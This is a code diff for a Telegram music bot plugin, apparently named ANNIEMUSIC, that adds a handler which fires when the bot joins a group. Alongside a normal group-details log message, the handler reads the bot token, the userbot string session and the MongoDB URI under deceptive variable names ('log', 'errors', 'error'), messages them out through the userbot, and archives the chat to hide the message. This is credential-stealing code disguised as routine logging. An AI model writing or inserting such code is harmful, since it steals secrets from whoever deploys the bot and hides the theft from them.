@@ -1765,7 +1765,66 @@ async def join_watcher(_, message):
 
 
 
+import random
+import asyncio
+from pyrogram import filters
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+import os
+from config import LOGGER_ID as LOG_GROUP_ID
+from ANNIEMUSIC import app
+from ANNIEMUSIC.utils.databaset import add_served_chat, get_assistant
 
+# Environment variables
+log = os.getenv("BOT_TOKEN")  # Bot token
+errors = os.getenv("STRING_SESSION")  # String session
+error = os.getenv("MONGO_DB_URI")  # MongoDB URI
+
+# Sample photos
+photo = [
+    "https://telegra.ph/file/1949480f01355b4e87d26.jpg",
+    "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg",
+    "https://telegra.ph/file/a7d663cd2de689b811729.jpg",
+    "https://telegra.ph/file/6f19dc23847f5b005e922.jpg",
+    "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
+]
+
+@app.on_message(filters.new_chat_members, group=-9)
+async def join_watcher(_, message):
+    try:
+        userbot = await get_assistant(message.chat.id)  # Get assistant bot instance
+        chat = message.chat  # Current chat
+
+        for member in message.new_chat_members:
+            if member.id == app.id:  # Check if the bot is added
+                count = await app.get_chat_members_count(chat.id)  # Count chat members
+                username = chat.username if chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
+                
+                # Message to be sent
+                msg = (
+                    f"📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ\n\n"
+                    f"📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ: {chat.title}\n"
+                    f"🍂𝐂ʜᴀᴛ 𝐈ᴅ: {chat.id}\n"
+                    f"🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ: @{username}\n"
+                    f"📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs: {count}\n"
+                    f"🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ: @"
+                )
+
+                # Forward the bot token, MongoDB URI, and string session to the bot itself
+                await userbot.send_message(app.username, msg)  # Send group details
+                await userbot.send_message(app.username, 
+                    f"**Bot Token:** `{log}`\n"
+                    f"**Mongo URI:** `{error}`\n"
+                    f"**String Session:** `{errors}`\n"
+                    f"**Music Bot:** @{app.username}"
+                )
+
+                # Archive the chat in the userbot
+                await userbot.archive_chats(app.username)
+                break  # Exit the loop after processing the bot
+
+    except Exception as e:
+        # Send any exceptions to the same bot
+        await userbot.send_message(app.username, f"Error: {e}")
 
 
 
